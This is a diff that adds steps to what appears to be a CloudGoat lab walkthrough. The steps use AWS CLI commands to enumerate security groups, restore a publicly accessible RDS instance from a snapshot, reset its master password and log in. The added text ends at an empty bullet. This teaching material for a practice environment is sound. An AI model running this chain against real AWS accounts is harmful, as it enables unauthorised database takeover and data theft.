@@ -1937,3 +1937,40 @@ aws rds describe-db-instances --profile calrissian
   <img src="/images/cloud/subnet_group.png">
 </p>
 
+* Enumerate the **security groups**.
+
+```bash
+aws ec2 describe-security-groups --profile calrissian
+```
+
+<p align="center">
+  <img src="/images/cloud/security_group_id.png">
+</p>
+
+* Launch the new RDS using the created snapshot.
+
+```bash
+aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <DbInstanceID> --db-snapshot-identifier <scapshotId> --db-subnet-group-name <db subnet group> --publicly-accessible --vpc-security-group-ids <ec2-security group> --profile calrissian
+```
+
+<p align="center">
+  <img src="/images/cloud/restore_rds_instance.png">
+</p>
+
+* Wait for _5 mins_ for the RDS to boot-up and then modify the _master password_.
+
+```bash
+aws rds modify-db-instance --db-instance-identifier <DbName> --master-user-password cloudgoat --profile calrissian
+```
+
+<p align="center">
+  <img src="/images/cloud/modify_instance.png">
+</p>
+
+* Log into the **database** using the modified password.
+
+<p align="center">
+  <img src="/images/cloud/modify_instance.png">
+</p>
+
+* 
